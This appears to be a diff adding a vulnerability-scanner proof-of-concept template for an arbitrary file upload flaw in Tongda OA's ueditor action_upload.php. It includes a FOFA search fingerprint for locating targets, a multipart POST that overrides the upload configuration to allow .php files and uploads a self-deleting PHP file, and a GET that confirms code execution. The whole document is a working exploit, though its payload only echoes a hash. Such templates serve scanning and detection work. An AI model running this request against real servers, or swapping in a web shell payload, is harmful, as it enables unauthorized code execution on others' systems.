@@ -1,0 +1,67 @@
+id: poc-yaml-tongda-oa-action-upload-php-anyfile-upload
+info:
+  name: 通达OA action_upload.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 通达OA
+  fofa: body="Office Anywhere 2017版 网络智能办公系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /module/ueditor/php/action_upload.php
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724
+  data: '-----------------------------55719851240137822763221368724
+
+    Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+
+    ffff
+
+    -----------------------------55719851240137822763221368724
+
+    Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+
+    1000000000
+
+    -----------------------------55719851240137822763221368724
+
+    Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+
+    {{.t1}}
+
+    -----------------------------55719851240137822763221368724
+
+    Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+
+    .php
+
+    -----------------------------55719851240137822763221368724
+
+    Content-Disposition: form-data; name="ffff"; filename="{{.t1}}.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo md5({{.t1}});unlink(__FILE__);?>
+
+    -----------------------------55719851240137822763221368724
+
+    Content-Disposition: form-data; name="mufile"
+
+
+    submit
+
+    -----------------------------55719851240137822763221368724--'
+  expression: status_code == 200 && body == ""
+- method: GET
+  path: /{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
